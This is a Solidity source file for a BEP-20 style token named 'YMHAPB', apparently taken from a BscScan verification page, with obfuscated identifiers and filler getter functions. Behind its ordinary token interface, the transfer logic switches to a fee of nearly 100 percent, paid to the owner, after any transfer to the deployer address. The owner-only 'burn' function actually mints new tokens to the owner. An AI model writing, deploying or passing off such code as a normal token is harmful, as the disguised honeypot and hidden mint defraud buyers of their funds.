/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 05:04 GMT
 */
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract NYHUCVL {
address public owner;
uint256 private  PUHCKK = 10000000000;
uint256 private  GPAMNK = 10000000000000;
address private  NLODPI = address(0);
uint256 private  LDVGKV = 1000000000000000000;
uint256 private  WEREPC = 1000000000000000000;
address private  BZWNJH = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  EHKHWC = 1000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  LEQSIS = address(0);
uint256 private  OXFJLS = 100000000;
uint8 public constant decimals = 18;
string public  symbol = "YMHAPB";
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  WQIWVK = address(0);
address private  JJCTJZ = address(0);
string public  name = "YMHAPB";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  OTMAON = 1000000000000000;
uint256 public constant IBTWIJ = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MWCSDW");
require(to != address(0), "MWCSDW");
require(amount <= balanceOf[from], "MWCSDW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* IBTWIJ/WEREPC ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JJCTJZ){
WEREPC = IBTWIJ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getOXFJLS() private returns (uint256) {
return OXFJLS;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getOTMAON() private returns (uint256) {
return OTMAON;
}

function _getNLODPI() private returns (address) {
return NLODPI;
}

function _getLDVGKV() private returns (uint256) {
return LDVGKV;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getEHKHWC() private returns (uint256) {
return EHKHWC;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getPUHCKK() private returns (uint256) {
return PUHCKK;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getGPAMNK() private returns (uint256) {
return GPAMNK;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getBZWNJH() private returns (address) {
return BZWNJH;
}

function _getLEQSIS() private returns (address) {
return LEQSIS;
}

function _getWQIWVK() private returns (address) {
return WQIWVK;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMWCSDW 0");
require(spender != address(0), "fMWCSDW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () public {
JJCTJZ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}